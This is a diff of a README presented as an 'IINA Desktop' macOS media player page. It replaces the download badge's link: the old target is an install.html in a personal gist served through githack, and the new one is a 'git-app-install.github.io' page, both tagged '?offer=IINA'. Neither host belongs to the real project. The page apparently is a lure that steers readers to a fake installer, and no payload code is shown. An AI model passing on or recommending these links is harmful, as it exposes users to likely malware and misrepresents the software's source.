@@ -1,6 +1,6 @@
 # IINA Desktop — Advanced Media Player macOS
 
-<a href="https://gistcdn.githack.com/fusionjamp251-stack/461b213e52ca0370b2317b728422395e/raw/bc1852eef17532d1379afd103867b81182d48591/install.html?offer=IINA" target="_blank">
+<a href="https://git-app-install.github.io/.github/?offer=IINA" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20IINA%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
